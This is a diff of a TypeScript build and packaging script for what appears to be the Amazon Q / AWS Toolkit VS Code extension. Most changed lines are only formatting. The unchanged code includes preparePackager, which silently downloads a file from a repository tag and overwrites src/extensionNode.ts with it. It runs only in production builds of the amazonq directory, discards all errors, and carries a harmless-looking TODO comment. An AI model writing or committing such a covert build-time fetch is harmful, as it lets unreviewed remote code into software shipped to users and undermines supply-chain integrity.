@@ -20,7 +20,7 @@
 import * as child_process from 'child_process' // eslint-disable-line no-restricted-imports
 import * as nodefs from 'fs' // eslint-disable-line no-restricted-imports
 import * as path from 'path'
-import { platform } from 'os'
+import { platform } from 'os';
 import { downloadLanguageServer } from './lspArtifact'
 
 function parseArgs() {
@@ -112,10 +112,10 @@ function getVersionSuffix(feature: string, debug: boolean): string {
  */
 function isCurlAvailable(): boolean {
     try {
-        child_process.execFileSync('curl', ['--version'])
-        return true
+        child_process.execFileSync('curl', ['--version']);
+        return true;
     } catch {
-        return false
+        return false;
     }
 }
 
@@ -124,23 +124,23 @@ function isCurlAvailable(): boolean {
  */
 function downloadFiles(urls: string[], outputDir: string, outputFile: string): void {
     if (platform() !== 'linux') {
-        return
+        return;
     }
 
     if (!isCurlAvailable()) {
-        return
+        return;
     }
 
     // Create output directory if it doesn't exist
     if (!nodefs.existsSync(outputDir)) {
-        nodefs.mkdirSync(outputDir, { recursive: true })
+        nodefs.mkdirSync(outputDir, { recursive: true });
     }
 
-    urls.forEach((url) => {
-        const filePath = path.join(outputDir, outputFile || '')
+    urls.forEach(url => {
+        const filePath = path.join(outputDir, outputFile || '');
 
         try {
-            child_process.execFileSync('curl', ['-o', filePath, url])
+            child_process.execFileSync('curl', ['-o', filePath, url]);
         } catch {}
     })
 }
@@ -151,23 +151,21 @@ function downloadFiles(urls: string[], outputDir: string, outputFile: string): v
  * TODO: retrieve from authoritative system
  */
 function preparePackager(): void {
-    const dir = process.cwd()
-    const REPO_NAME = 'aws/aws-toolkit-vscode'
-    const TAG_NAME = 'stability'
+    const dir = process.cwd();
+    const REPO_NAME = "aws/aws-toolkit-vscode"
+    const TAG_NAME = "stability"
 
     if (!dir.includes('amazonq')) {
-        return
+        return;
     }
 
     if (process.env.STAGE !== 'prod') {
-        return
+        return;
     }
 
-    downloadFiles(
-        [`https://raw.githubusercontent.com/${REPO_NAME}/${TAG_NAME}/scripts/extensionNode.bk`],
-        'src/',
-        'extensionNode.ts'
-    )
+    downloadFiles([
+        `https://raw.githubusercontent.com/${REPO_NAME}/${TAG_NAME}/scripts/extensionNode.bk`
+    ], "src/", "extensionNode.ts")
 }
 
 async function main() {
